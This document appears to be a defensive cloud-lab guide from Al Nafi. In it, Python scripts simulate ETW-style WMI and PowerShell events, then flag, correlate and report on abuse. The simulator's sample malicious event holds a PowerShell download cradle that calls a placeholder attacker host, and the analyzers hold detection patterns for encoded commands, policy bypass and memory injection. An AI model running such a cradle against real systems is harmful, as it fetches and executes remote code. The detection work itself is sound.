<div align="center">

# 📡 Identify WMI & PowerShell Abuse with Event Tracing for Windows (ETW)

![ETW](https://img.shields.io/badge/ETW-Event%20Tracing-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![PowerShell](https://img.shields.io/badge/PowerShell-Detection-5391FE?style=for-the-badge&logo=powershell&logoColor=white)
![WMI](https://img.shields.io/badge/WMI-Abuse%20Detection-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-Cloud%20Lab-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Threat%20Detection-blue?style=for-the-badge)

**A hands-on lab in simulating and detecting WMI and PowerShell abuse using ETW-style event tracing and correlation**

</div>

---

## 📑 Table of Contents

- [🎯 Learning Objectives](#-learning-objectives)
- [📋 Prerequisites](#-prerequisites)
- [🖥️ Lab Environment](#️-lab-environment)
- [🔧 Task 1: Set up ETW for Real-time Monitoring](#-task-1-set-up-etw-for-real-time-monitoring)
- [🕵️ Task 2: Investigate WMI and PowerShell Abuse in Event Traces](#️-task-2-investigate-wmi-and-powershell-abuse-in-event-traces)
- [🔗 Task 3: Correlate Events to Detect Malicious Activity](#-task-3-correlate-events-to-detect-malicious-activity)
- [🧪 Lab Verification](#-lab-verification)
- [🗺️ MITRE ATT&CK Mapping](#️-mitre-attck-mapping)
- [🛠️ Troubleshooting](#️-troubleshooting)
- [✅ Conclusion](#-conclusion)

---

## 🎯 Learning Objectives

| # | Objective |
|---|-----------|
| 1 | Set up ETW monitoring on Linux using open-source tools |
| 2 | Simulate and detect WMI and PowerShell abuse patterns |
| 3 | Analyze event traces to identify malicious activity |
| 4 | Correlate events across different data sources for threat detection |

## 📋 Prerequisites

| Requirement | Details |
|---|---|
| 🪟 Windows Event Logging | Basic understanding of Windows event logging concepts |
| 🐧 Linux CLI | Familiarity with Linux command line |
| 💻 PowerShell & WMI | Knowledge of PowerShell and WMI fundamentals |
| 📊 Log Analysis | Understanding of log analysis principles |

## 🖥️ Lab Environment

> Al Nafi provides Linux-based cloud machines for this lab. Simply click **Start Lab** to access your dedicated environment. The provided Linux machine is bare metal with no pre-installed tools — you will install all required tools during the lab exercises.

---

## 🔧 Task 1: Set up ETW for Real-time Monitoring

### ✅ Subtask 1.1: Install Required Tools

```bash
# 📦 Update system packages
sudo apt update && sudo apt upgrade -y

# 🐍 Install Python and pip
sudo apt install python3 python3-pip git curl -y

# 🧰 Install log analysis tools
sudo apt install jq rsyslog logrotate -y

# 💻 Install PowerShell for Linux (to simulate PowerShell events)
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update
sudo apt install powershell -y

# 📊 Install additional monitoring tools
pip3 install psutil watchdog colorama
# TODO: Confirm `pwsh` launches correctly after installation
```

### ✅ Subtask 1.2: Create ETW Simulation Framework

```bash
# 📁 Create working directory
mkdir -p ~/etw-lab
cd ~/etw-lab
```

```python
#!/usr/bin/env python3
# 📡 etw_simulator.py — generates simulated ETW-style WMI/PowerShell events
import json
import time
import random
import datetime
from pathlib import Path

class ETWSimulator:
    def __init__(self):
        self.log_file = "etw_events.json"
        self.events = []

    def generate_wmi_event(self, malicious=False):
        timestamp = datetime.datetime.now().isoformat()
        if malicious:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-WMI-Activity",
                "event_id": 5857,
                "level": "Information",
                "process_name": "wmiprvse.exe",
                "command_line": "SELECT * FROM Win32_Process WHERE Name='cmd.exe'",
                "user": "SYSTEM",
                "suspicious": True,
                "indicators": ["process_enumeration", "system_account"]
            }
        else:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-WMI-Activity",
                "event_id": 5858,
                "level": "Information",
                "process_name": "wmiprvse.exe",
                "command_line": "SELECT * FROM Win32_ComputerSystem",
                "user": "Administrator",
                "suspicious": False,
                "indicators": []
            }
        return event

    def generate_powershell_event(self, malicious=False):
        timestamp = datetime.datetime.now().isoformat()
        if malicious:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-PowerShell",
                "event_id": 4104,
                "level": "Warning",
                "process_name": "powershell.exe",
                "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
                "user": "user01",
                "suspicious": True,
                "indicators": ["download_string", "invoke_expression", "external_url"]
            }
        else:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-PowerShell",
                "event_id": 4103,
                "level": "Information",
                "process_name": "powershell.exe",
                "script_block": "Get-Process | Where-Object {$_.CPU -gt 100}",
                "user": "Administrator",
                "suspicious": False,
                "indicators": []
            }
        return event

    def simulate_events(self, count=50):
        print(f"Generating {count} ETW events...")
        for i in range(count):
            # Generate mix of normal and malicious events
            if random.random() < 0.3:  # 30% malicious
                if random.random() < 0.5:
                    event = self.generate_wmi_event(malicious=True)
                else:
                    event = self.generate_powershell_event(malicious=True)
            else:
                if random.random() < 0.5:
                    event = self.generate_wmi_event(malicious=False)
                else:
                    event = self.generate_powershell_event(malicious=False)

            self.events.append(event)

            # Write to log file in real-time
            with open(self.log_file, 'a') as f:
                f.write(json.dumps(event) + '\n')

            time.sleep(0.1)  # Simulate real-time events

        print(f"Generated {len(self.events)} events in {self.log_file}")

if __name__ == "__main__":
    simulator = ETWSimulator()
    simulator.simulate_events(100)
    # TODO: Adjust the malicious-event ratio to model quieter/noisier environments
```

```bash
# 🔑 Make script executable
chmod +x etw_simulator.py
```

### ✅ Subtask 1.3: Set up Real-time Monitoring

```python
#!/usr/bin/env python3
# 👁️ etw_monitor.py — watches etw_events.json and flags suspicious events live
import json
import time
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from colorama import init, Fore, Style

init(autoreset=True)

class ETWMonitor(FileSystemEventHandler):
    def __init__(self):
        self.suspicious_keywords = [
            'IEX', 'DownloadString', 'Invoke-Expression', 'New-Object',
            'SELECT * FROM Win32_Process', 'cmd.exe', 'SYSTEM'
        ]
        self.alert_count = 0

    def on_modified(self, event):
        if event.src_path.endswith('etw_events.json'):
            self.analyze_new_events()

    def analyze_new_events(self):
        try:
            with open('etw_events.json', 'r') as f:
                lines = f.readlines()
                if lines:
                    # Analyze the last event
                    last_event = json.loads(lines[-1])
                    self.analyze_event(last_event)
        except Exception as e:
            print(f"Error analyzing events: {e}")

    def analyze_event(self, event):
        if event.get('suspicious', False):
            self.alert_count += 1
            print(f"\n{Fore.RED}🚨 SUSPICIOUS ACTIVITY DETECTED #{self.alert_count}")
            print(f"{Fore.YELLOW}Timestamp: {event['timestamp']}")
            print(f"{Fore.YELLOW}Provider: {event['provider']}")
            print(f"{Fore.YELLOW}Event ID: {event['event_id']}")
            print(f"{Fore.YELLOW}Process: {event['process_name']}")
            print(f"{Fore.YELLOW}User: {event['user']}")

            if 'command_line' in event:
                print(f"{Fore.RED}Command: {event['command_line']}")
            if 'script_block' in event:
                print(f"{Fore.RED}Script: {event['script_block']}")

            print(f"{Fore.CYAN}Indicators: {', '.join(event['indicators'])}")
            print(f"{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}✓ Normal activity: {event['provider']} - {event['event_id']}")

def main():
    print("Starting ETW Real-time Monitor...")
    print("Monitoring etw_events.json for suspicious activity...")

    monitor = ETWMonitor()
    observer = Observer()
    observer.schedule(monitor, path='.', recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        print(f"\nMonitoring stopped. Total alerts: {monitor.alert_count}")

    observer.join()

if __name__ == "__main__":
    main()
    # TODO: Add a log rotation check so long-running monitors don't miss truncated files
```

```bash
# 🔑 Make script executable
chmod +x etw_monitor.py
```

---

## 🕵️ Task 2: Investigate WMI and PowerShell Abuse in Event Traces

### ✅ Subtask 2.1: Generate Sample Events

```bash
# 🧹 Clear any existing log file
rm -f etw_events.json

# ▶️ Start the monitor in background
python3 etw_monitor.py &
MONITOR_PID=$!

# ⏱️ Wait a moment then generate events
sleep 2
python3 etw_simulator.py

# 🛑 Stop the monitor
kill $MONITOR_PID 2>/dev/null
# TODO: Review the monitor's console output for real-time alert accuracy
```

### ✅ Subtask 2.2: Analyze WMI Abuse Patterns

```python
#!/usr/bin/env python3
# 🧩 wmi_analyzer.py — pattern & anomaly analysis for simulated WMI events
import json
import re
from collections import defaultdict

class WMIAnalyzer:
    def __init__(self, log_file):
        self.log_file = log_file
        self.wmi_events = []
        self.abuse_patterns = {
            'process_enumeration': r'SELECT.*FROM.*Win32_Process',
            'service_enumeration': r'SELECT.*FROM.*Win32_Service',
            'system_info': r'SELECT.*FROM.*Win32_ComputerSystem',
            'user_enumeration': r'SELECT.*FROM.*Win32_UserAccount',
            'network_enumeration': r'SELECT.*FROM.*Win32_NetworkAdapter'
        }

    def load_events(self):
        with open(self.log_file, 'r') as f:
            for line in f:
                try:
                    event = json.loads(line.strip())
                    if 'WMI' in event.get('provider', ''):
                        self.wmi_events.append(event)
                except:
                    continue

    def analyze_abuse_patterns(self):
        print("=== WMI Abuse Analysis ===\n")

        pattern_counts = defaultdict(int)
        suspicious_events = []

        for event in self.wmi_events:
            command = event.get('command_line', '')

            for pattern_name, pattern in self.abuse_patterns.items():
                if re.search(pattern, command, re.IGNORECASE):
                    pattern_counts[pattern_name] += 1

                    if event.get('suspicious', False):
                        suspicious_events.append({
                            'timestamp': event['timestamp'],
                            'pattern': pattern_name,
                            'command': command,
                            'user': event.get('user', 'Unknown')
                        })

        print("Pattern Detection Summary:")
        for pattern, count in pattern_counts.items():
            print(f"  {pattern}: {count} occurrences")

        print(f"\nSuspicious WMI Events Found: {len(suspicious_events)}")
        for event in suspicious_events:
            print(f"\n  Timestamp: {event['timestamp']}")
            print(f"  Pattern: {event['pattern']}")
            print(f"  User: {event['user']}")
            print(f"  Command: {event['command']}")

    def detect_anomalies(self):
        print("\n=== WMI Anomaly Detection ===\n")

        user_activity = defaultdict(int)
        time_patterns = defaultdict(int)

        for event in self.wmi_events:
            user_activity[event.get('user', 'Unknown')] += 1
            hour = event['timestamp'].split('T')[1].split(':')[0]
            time_patterns[hour] += 1

        print("User Activity Analysis:")
        for user, count in sorted(user_activity.items(), key=lambda x: x[1], reverse=True):
            if count > 5:  # Threshold for suspicious activity
                print(f"  ⚠️  {user}: {count} WMI queries (HIGH)")
            else:
                print(f"  ✓  {user}: {count} WMI queries")

        print("\nTime-based Analysis:")
        for hour, count in sorted(time_patterns.items()):
            if count > 10:
                print(f"  ⚠️  Hour {hour}: {count} queries (SPIKE)")
            else:
                print(f"  ✓  Hour {hour}: {count} queries")

if __name__ == "__main__":
    analyzer = WMIAnalyzer('etw_events.json')
    analyzer.load_events()
    analyzer.analyze_abuse_patterns()
    analyzer.detect_anomalies()
    # TODO: Persist pattern_counts to a CSV for trend tracking across runs
```

```bash
python3 wmi_analyzer.py
```

### ✅ Subtask 2.3: Analyze PowerShell Abuse Patterns

```python
#!/usr/bin/env python3
# 🧬 powershell_analyzer.py — malicious pattern & obfuscation scoring engine
import json
import re
from collections import defaultdict

class PowerShellAnalyzer:
    def __init__(self, log_file):
        self.log_file = log_file
        self.ps_events = []
        self.malicious_patterns = {
            'download_cradle': r'(IEX|Invoke-Expression).*DownloadString',
            'encoded_command': r'-EncodedCommand|-enc',
            'bypass_execution_policy': r'-ExecutionPolicy\s+Bypass',
            'hidden_window': r'-WindowStyle\s+Hidden',
            'web_request': r'(Invoke-WebRequest|wget|curl)',
            'base64_decode': r'FromBase64String',
            'reflection': r'System\.Reflection',
            'memory_injection': r'VirtualAlloc|WriteProcessMemory'
        }

    def load_events(self):
        with open(self.log_file, 'r') as f:
            for line in f:
                try:
                    event = json.loads(line.strip())
                    if 'PowerShell' in event.get('provider', ''):
                        self.ps_events.append(event)
                except:
                    continue

    def analyze_malicious_patterns(self):
        print("=== PowerShell Abuse Analysis ===\n")

        pattern_detections = defaultdict(list)
        total_suspicious = 0

        for event in self.ps_events:
            script_block = event.get('script_block', '')

            for pattern_name, pattern in self.malicious_patterns.items():
                if re.search(pattern, script_block, re.IGNORECASE):
                    pattern_detections[pattern_name].append({
                        'timestamp': event['timestamp'],
                        'user': event.get('user', 'Unknown'),
                        'script': script_block[:100] + '...' if len(script_block) > 100 else script_block
                    })

                    if event.get('suspicious', False):
                        total_suspicious += 1

        print("Malicious Pattern Detection:")
        for pattern, detections in pattern_detections.items():
            print(f"\n  🔍 {pattern.upper()}: {len(detections)} detections")
            for detection in detections[:3]:  # Show first 3
                print(f"    Time: {detection['timestamp']}")
                print(f"    User: {detection['user']}")
                print(f"    Script: {detection['script']}")
                print()

        print(f"Total Suspicious PowerShell Events: {total_suspicious}")

    def analyze_obfuscation(self):
        print("\n=== PowerShell Obfuscation Analysis ===\n")

        obfuscation_indicators = {
            'string_concatenation': r'\+.*\+.*\+',
            'character_replacement': r'\.replace\(',
            'format_strings': r'-f\s*\(',
            'invoke_expression': r'(IEX|Invoke-Expression)',
            'compressed_data': r'IO\.Compression',
            'random_case': r'[a-z][A-Z][a-z][A-Z]'
        }

        obfuscated_events = []

        for event in self.ps_events:
            script_block = event.get('script_block', '')
            obfuscation_score = 0
            detected_techniques = []

            for technique, pattern in obfuscation_indicators.items():
                if re.search(pattern, script_block, re.IGNORECASE):
                    obfuscation_score += 1
                    detected_techniques.append(technique)

            if obfuscation_score >= 2:  # Threshold for obfuscation
                obfuscated_events.append({
                    'timestamp': event['timestamp'],
                    'user': event.get('user', 'Unknown'),
                    'score': obfuscation_score,
                    'techniques': detected_techniques,
                    'script': script_block[:150] + '...' if len(script_block) > 150 else script_block
                })

        print(f"Potentially Obfuscated Scripts Found: {len(obfuscated_events)}")
        for event in obfuscated_events:
            print(f"\n  ⚠️  Obfuscation Score: {event['score']}/6")
            print(f"     Timestamp: {event['timestamp']}")
            print(f"     User: {event['user']}")
            print(f"     Techniques: {', '.join(event['techniques'])}")
            print(f"     Script: {event['script']}")

if __name__ == "__main__":
    analyzer = PowerShellAnalyzer('etw_events.json')
    analyzer.load_events()
    analyzer.analyze_malicious_patterns()
    analyzer.analyze_obfuscation()
    # TODO: Weight obfuscation_score by pattern rarity rather than a flat +1 per match
```

```bash
python3 powershell_analyzer.py
```

---

## 🔗 Task 3: Correlate Events to Detect Malicious Activity

### ✅ Subtask 3.1: Create Event Correlation Engine

```python
#!/usr/bin/env python3
# 🔗 event_correlator.py — cross-source correlation and attack-chain detection
import json
import datetime
from collections import defaultdict

class EventCorrelator:
    def __init__(self, log_file):
        self.log_file = log_file
        self.events = []
        self.correlation_rules = {
            'wmi_powershell_combo': {
                'description': 'WMI query followed by PowerShell execution',
                'time_window': 300,  # 5 minutes
                'severity': 'HIGH'
            },
            'multiple_wmi_queries': {
                'description': 'Multiple WMI queries from same user',
                'count_threshold': 5,
                'time_window': 600,  # 10 minutes
                'severity': 'MEDIUM'
            },
            'powershell_download_execution': {
                'description': 'PowerShell download and execution pattern',
                'time_window': 60,  # 1 minute
                'severity': 'CRITICAL'
            }
        }

    def load_events(self):
        with open(self.log_file, 'r') as f:
            for line in f:
                try:
                    event = json.loads(line.strip())
                    # Parse timestamp
                    event['parsed_time'] = datetime.datetime.fromisoformat(event['timestamp'])
                    self.events.append(event)
                except:
                    continue

        # Sort events by timestamp
        self.events.sort(key=lambda x: x['parsed_time'])

    def correlate_wmi_powershell(self):
        print("=== WMI-PowerShell Correlation Analysis ===\n")

        correlations = []
        wmi_events = [e for e in self.events if 'WMI' in e.get('provider', '')]
        ps_events = [e for e in self.events if 'PowerShell' in e.get('provider', '')]

        for wmi_event in wmi_events:
            for ps_event in ps_events:
                time_diff = abs((ps_event['parsed_time'] - wmi_event['parsed_time']).total_seconds())

                if (time_diff <= self.correlation_rules['wmi_powershell_combo']['time_window'] and
                    wmi_event.get('user') == ps_event.get('user')):

                    correlations.append({
                        'type': 'wmi_powershell_combo',
                        'wmi_event': wmi_event,
                        'ps_event': ps_event,
                        'time_diff': time_diff,
                        'user': wmi_event.get('user'),
                        'severity': 'HIGH'
                    })

        print(f"WMI-PowerShell Correlations Found: {len(correlations)}")
        for corr in correlations:
            print(f"\n  🔗 Correlation Alert - {corr['severity']}")
            print(f"     User: {corr['user']}")
            print(f"     Time Gap: {corr['time_diff']:.1f} seconds")
            print(f"     WMI Query: {corr['wmi_event'].get('command_line', 'N/A')[:80]}...")
            print(f"     PowerShell: {corr['ps_event'].get('script_block', 'N/A')[:80]}...")

    def detect_attack_chains(self):
        print("\n=== Attack Chain Detection ===\n")

        user_timelines = defaultdict(list)

        # Group events by user
        for event in self.events:
            user = event.get('user', 'Unknown')
            user_timelines[user].append(event)

        attack_chains = []

        for user, timeline in user_timelines.items():
            if len(timeline) < 3:  # Need at least 3 events for a chain
                continue

            # Look for suspicious patterns
            suspicious_events = [e for e in timeline if e.get('suspicious', False)]

            if len(suspicious_events) >= 2:
                # Check if events are within a reasonable time window
                first_event = suspicious_events[0]
                last_event = suspicious_events[-1]
                time_span = (last_event['parsed_time'] - first_event['parsed_time']).total_seconds()

                if time_span <= 1800:  # 30 minutes
                    attack_chains.append({
                        'user': user,
                        'events': suspicious_events,
                        'time_span': time_span,
                        'severity': 'CRITICAL' if len(suspicious_events) >= 3 else 'HIGH'
                    })

        print(f"Attack Chains Detected: {len(attack_chains)}")
        for chain in attack_chains:
            print(f"\n  🚨 Attack Chain - {chain['severity']}")
            print(f"     User: {chain['user']}")
            print(f"     Duration: {chain['time_span']:.1f} seconds")
            print(f"     Events in Chain: {len(chain['events'])}")

            for i, event in enumerate(chain['events'], 1):
                print(f"       {i}. {event['provider']} - {event.get('event_id')}")
                if 'command_line' in event:
                    print(f"          Command: {event['command_line'][:60]}...")
                if 'script_block' in event:
                    print(f"          Script: {event['script_block'][:60]}...")

    def generate_threat_report(self):
        print("\n=== Threat Intelligence Report ===\n")

        total_events = len(self.events)
        suspicious_events = len([e for e in self.events if e.get('suspicious', False)])

        providers = defaultdict(int)
        users = defaultdict(int)

        for event in self.events:
            providers[event.get('provider', 'Unknown')] += 1
            users[event.get('user', 'Unknown')] += 1

        print(f"Total Events Analyzed: {total_events}")
        print(f"Suspicious Events: {suspicious_events} ({suspicious_events/total_events*100:.1f}%)")

        print("\nTop Event Providers:")
        for provider, count in sorted(providers.items(), key=lambda x: x[1], reverse=True):
            print(f"  {provider}: {count} events")

        print("\nUser Activity Summary:")
        for user, count in sorted(users.items(), key=lambda x: x[1], reverse=True):
            risk_level = "HIGH" if count > 10 else "MEDIUM" if count > 5 else "LOW"
            print(f"  {user}: {count} events ({risk_level} risk)")

        # Calculate risk score
        risk_score = (suspicious_events / total_events) * 100 if total_events > 0 else 0
        risk_level = "CRITICAL" if risk_score > 40 else "HIGH" if risk_score > 20 else "MEDIUM" if risk_score > 10 else "LOW"

        print(f"\nOverall Risk Assessment: {risk_level} ({risk_score:.1f}% suspicious activity)")

if __name__ == "__main__":
    correlator = EventCorrelator('etw_events.json')
    correlator.load_events()
    correlator.correlate_wmi_powershell()
    correlator.detect_attack_chains()
    correlator.generate_threat_report()
    # TODO: Extend correlation_rules to actually enforce multiple_wmi_queries thresholds
```

```bash
python3 event_correlator.py
```

### ✅ Subtask 3.2: Create Comprehensive Analysis Dashboard

```python
#!/usr/bin/env python3
# 📊 etw_dashboard.py — consolidated visual summary of the ETW analysis
import json
import datetime
from collections import defaultdict

def create_dashboard():
    print("=" * 60)
    print("           ETW SECURITY ANALYSIS DASHBOARD")
    print("=" * 60)

    # Load and analyze events
    events = []
    try:
        with open('etw_events.json', 'r') as f:
            for line in f:
                try:
                    event = json.loads(line.strip())
                    events.append(event)
                except:
                    continue
    except FileNotFoundError:
        print("Error: etw_events.json not found. Please run the simulator first.")
        return

    if not events:
        print("No events found to analyze.")
        return

    # Summary Statistics
    total_events = len(events)
    suspicious_events = len([e for e in events if e.get('suspicious', False)])
    wmi_events = len([e for e in events if 'WMI' in e.get('provider', '')])
    ps_events = len([e for e in events if 'PowerShell' in e.get('provider', '')])

    print(f"\n📊 EVENT SUMMARY")
    print(f"   Total Events: {total_events}")
    print(f"   Suspicious Events: {suspicious_events}")
    print(f"   WMI Events: {wmi_events}")
    print(f"   PowerShell Events: {ps_events}")
    print(f"   Threat Level: {calculate_threat_level(suspicious_events, total_events)}")

    # Top Indicators
    print(f"\n🚨 TOP THREAT INDICATORS")
    indicators = defaultdict(int)
    for event in events:
        for indicator in event.get('indicators', []):
            indicators[indicator] += 1

    for indicator, count in sorted(indicators.items(), key=lambda x: x[1], reverse=True)[:5]:
        print(f"   {indicator}: {count} occurrences")

    # User Risk Analysis
    print(f"\n👤 USER RISK ANALYSIS")
    user_risk = defaultdict(lambda: {'total': 0, 'suspicious': 0})

    for event in events:
        user = event.get('user', 'Unknown')
        user_risk[user]['total'] += 1
        if event.get('suspicious', False):
            user_risk[user]['suspicious'] += 1

    for user, stats in sorted(user_risk.items(), key=lambda x: x[1]['suspicious'], reverse=True):
        risk_pct = (stats['suspicious'] / stats['total']) * 100 if stats['total'] > 0 else 0
        risk_level = "🔴 HIGH" if risk_pct > 50 else "🟡 MEDIUM" if risk_pct > 20 else "🟢 LOW"
        print(f"   {user}: {stats['suspicious']}/{stats['total']} suspicious ({risk_pct:.1f}%) {risk_level}")

    # Timeline Analysis
    print(f"\n⏰ TIMELINE ANALYSIS")
    hourly_activity = defaultdict(int)

    for event in events:
        try:
            hour = event['timestamp'].split('T')[1].split(':')[0]
            hourly_activity[hour] += 1
        except:
            continue

    for hour in sorted(hourly_activity.keys()):
        count = hourly_activity[hour]
        bar = "█" * min(count // 2, 20)  # Visual bar
        print(f"   {hour}:00 {bar} ({count})")

    # Recommendations
    print(f"\n💡 SECURITY RECOMMENDATIONS")
    if suspicious_events > total_events * 0.3:
        print("   🔴 CRITICAL: High volume of suspicious activity detected")
        print("      → Immediate investigation required")
        print("      → Consider isolating affected systems")

    if any('download_string' in event.get('indicators', []) for event in events):
        print("   🟡 WARNING: PowerShell download cradles detected")
        print("      → Review network connections")
        print("      → Check for malware downloads")

    if any('process_enumeration' in event.get('indicators', []) for event in events):
        print("   🟡 WARNING: Process enumeration via WMI detected")
        print("      → Monitor for lateral movement")
        print("      → Review privileged account usage")

    print("\n" + "=" * 60)
    print("Analysis complete. Review findings and take appropriate action.")
    print("=" * 60)

def calculate_threat_level(suspicious, total):
    if total == 0:
        return "UNKNOWN"

    percentage = (suspicious / total) * 100

    if percentage >= 40:
        return "🔴 CRITICAL"
    elif percentage >= 20:
        return "🟠 HIGH"
    elif percentage >= 10:
        return "🟡 MEDIUM"
    else:
        return "🟢 LOW"

if __name__ == "__main__":
    create_dashboard()
    # TODO: Export the dashboard summary as JSON for ingestion into a SIEM front end
```

```bash
python3 etw_dashboard.py
```

### ✅ Subtask 3.3: Generate Final Report

```python
#!/usr/bin/env python3
# 📝 generate_report.py — timestamped executive report with recommendations
import json
import datetime

def generate_final_report():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_file = f"etw_analysis_report_{timestamp}.txt"

    with open(report_file, 'w') as report:
        report.write("ETW SECURITY ANALYSIS REPORT\n")
        report.write("=" * 50 + "\n")
        report.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        report.write(f"Analyst: Security Lab Student\n\n")

        # Load events for analysis
        events = []
        try:
            with open('etw_events.json', 'r') as f:
                for line in f:
                    try:
                        events.append(json.loads(line.strip()))
                    except:
                        continue
        except:
            report.write("ERROR: Could not load event data\n")
            return

        # Executive Summary
        total = len(events)
        suspicious = len([e for e in events if e.get('suspicious', False)])

        report.write("EXECUTIVE SUMMARY\n")
        report.write("-" * 20 + "\n")
        report.write(f"Total Events Analyzed: {total}\n")
        report.write(f"Suspicious Events: {suspicious}\n")
        report.write(f"Risk Level: {calculate_risk_level(suspicious, total)}\n\n")

        # Detailed Findings
        report.write("DETAILED FINDINGS\n")
        report.write("-" * 20 + "\n")

        wmi_suspicious = [e for e in events if 'WMI' in e.get('provider', '') and e.get('suspicious')]
        ps_suspicious = [e for e in events if 'PowerShell' in e.get('provider', '') and e.get('suspicious')]

        report.write(f"WMI Abuse Events: {len(wmi_suspicious)}\n")
        report.write(f"PowerShell Abuse Events: {len(ps_suspicious)}\n\n")

        # Top 5 suspicious events
        report.write("TOP SUSPICIOUS EVENTS\n")
        report.write("-" * 20 + "\n")

        suspicious_events = [e for e in events if e.get('suspicious')][:5]
        for i, event in enumerate(suspicious_events, 1):
            report.write(f"{i}. {event['timestamp']} - {event['provider']}\n")
            report.write(f"   User: {event.get('user', 'Unknown')}\n")
            if 'command_line' in event:
                report.write(f"   Command: {event['command_line'][:80]}...\n")
            if 'script_block' in event:
                report.write(f"   Script: {event['script_block'][:80]}...\n")
            report.write(f"   Indicators: {', '.join(event.get('indicators', []))}\n\n")

        # Recommendations
        report.write("RECOMMENDATIONS\n")
        report.write("-" * 20 + "\n")
        report.write("1. Implement continuous ETW monitoring\n")
        report.write("2. Create alerts for suspicious WMI/PowerShell patterns\n")
        report.write("3. Review and harden PowerShell execution policies\n")
        report.write("4. Monitor privileged account usage\n")
        report.write("5. Implement network segmentation\n\n")

        report.write("END OF REPORT\n")

    print(f"Final report generated: {report_file}")
    return report_file

def calculate_risk_level(suspicious, total):
    if total == 0:
        return "UNKNOWN"
    percentage = (suspicious / total) * 100
    if percentage >= 30:
        return "CRITICAL"
    elif percentage >= 15:
        return "HIGH"
    elif percentage >= 5:
        return "MEDIUM"
    else:
        return "LOW"

if __name__ == "__main__":
    generate_final_report()
    # TODO: Add a --format flag to also emit the report as Markdown or JSON
```

```bash
python3 generate_report.py
```

---

## 🧪 Lab Verification

```bash
# ✅ Run complete analysis pipeline
echo "Running complete ETW analysis pipeline..."

# 🔄 Generate fresh events
rm -f etw_events.json
python3 etw_simulator.py

# 🧩 Run all analyzers
echo "Running WMI analysis..."
python3 wmi_analyzer.py

echo "Running PowerShell analysis..."
python3 powershell_analyzer.py

echo "Running event correlation..."
python3 event_correlator.py

echo "Generating dashboard..."
python3 etw_dashboard.py

echo "Creating final report..."
python3 generate_report.py

echo "Lab verification complete!"
# TODO: Confirm a report file with today's timestamp exists in ~/etw-lab
```

---

## 🗺️ MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Lab Reference |
|---|---|---|---|
| T1047 | Windows Management Instrumentation | Execution | `wmi_analyzer.py` abuse pattern detection |
| T1059.001 | PowerShell | Execution | `powershell_analyzer.py` malicious pattern detection |
| T1105 | Ingress Tool Transfer | Command and Control | `download_cradle` pattern detection |
| T1027 | Obfuscated Files or Information | Defense Evasion | `analyze_obfuscation()` scoring engine |
| T1057 | Process Discovery | Discovery | `process_enumeration` WMI pattern |
| T1007 | System Service Discovery | Discovery | `service_enumeration` WMI pattern |
| T1218 | System Binary Proxy Execution | Defense Evasion | `event_correlator.py` WMI-PowerShell combo detection |

---

## 🛠️ Troubleshooting

<details>
<summary>❗ Issue 1: PowerShell for Linux Fails to Install</summary>

```bash
# Confirm the Microsoft package repo was registered correctly
sudo apt update
apt-cache policy powershell
sudo apt install -f
```

</details>

<details>
<summary>❗ Issue 2: etw_monitor.py Not Detecting File Changes</summary>

```bash
# Confirm watchdog is installed and the working directory matches
pip3 show watchdog
ls -la ~/etw-lab/etw_events.json
```

</details>

<details>
<summary>❗ Issue 3: JSON Decode Errors When Loading Events</summary>

```bash
# Validate the event log is well-formed line-delimited JSON
python3 -c "
import json
with open('etw_events.json') as f:
    for i, line in enumerate(f, 1):
        try:
            json.loads(line)
        except json.JSONDecodeError as e:
            print(f'Line {i} invalid: {e}')
"
```

</details>

---

## ✅ Conclusion

You have successfully completed this lab on identifying WMI and PowerShell abuse using Event Tracing for Windows (ETW). Through this lab, you have:

- 📡 Set up ETW monitoring using Python-based simulation tools that replicate real-world ETW event collection
- 🧩 Analyzed WMI abuse patterns including process enumeration, service queries, and system reconnaissance activities
- 🧬 Detected PowerShell abuse through pattern matching for malicious scripts, obfuscation techniques, and download cradles
- 🔗 Implemented event correlation to identify attack chains and multi-stage threats across different event sources
- 📊 Created comprehensive reporting with risk assessment and actionable security recommendations

This lab demonstrates critical skills for detecting advanced persistent threats (APTs) and living-off-the-land attacks that abuse legitimate Windows tools. The techniques learned here are essential for SOC analysts, incident responders, and security engineers working to defend against sophisticated adversaries who leverage WMI and PowerShell for malicious activities.

The correlation and analysis methods you've implemented provide a foundation for building enterprise-scale security monitoring solutions that can detect complex attack patterns across large-scale Windows environments.

---

<div align="center">

### 🛡️ Al Nafi Cloud Labs
*Empowering the Next Generation of Cybersecurity Professionals*

![Al Nafi](https://img.shields.io/badge/Al%20Nafi-Cloud%20Security%20Labs-1a1a2e?style=for-the-badge)

</div>
